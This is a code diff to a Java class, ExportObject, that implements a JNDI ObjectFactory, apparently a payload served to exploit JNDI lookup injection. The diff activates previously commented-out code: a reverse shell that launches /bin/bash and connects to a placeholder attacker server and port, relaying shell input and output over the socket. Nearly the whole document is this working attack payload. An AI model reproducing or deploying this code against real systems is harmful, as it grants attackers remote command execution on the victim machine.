@@ -22,33 +22,34 @@ public class ExportObject implements javax.naming.spi.ObjectFactory {
 
             //Pure Groovy/Java Reverse Shell
             //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
-//            String lhost = "127.0.0.1";
-//            int lport = 8080;
+
+            String lhost = "YOUR SERVER";
+            int lport = PORT_FOR_REVERSE_SHELL;
 ////            String cmd = "cmd.exe"; //win
-//            String cmd="/bin/bash"; //linux
-//            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-//            Socket s = new Socket(lhost,lport);
-//            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
-//            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
-//            while(!s.isClosed()) {
-//                while(pi.available() > 0)
-//                    so.write(pi.read());
-//                while(pe.available() > 0)
-//                    so.write(pe.read());
-//                while(si.available() > 0)
-//                    po.write(si.read());
-//                so.flush();
-//                po.flush();
-//                Thread.sleep(50);
-//                try {
-//                    p.exitValue();
-//                    break;
-//                } catch (Exception e){
-//
-//                }
-//            }
-//            p.destroy();
-//            s.close();
+            String cmd="/bin/bash"; //linux
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(lhost,lport);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while(!s.isClosed()) {
+                while(pi.available() > 0)
+                    so.write(pi.read());
+                while(pe.available() > 0)
+                    so.write(pe.read());
+                while(si.available() > 0)
+                    po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e){
+
+                }
+            }
+            p.destroy();
+            s.close();
 
         } catch(Exception e) {
             e.printStackTrace();
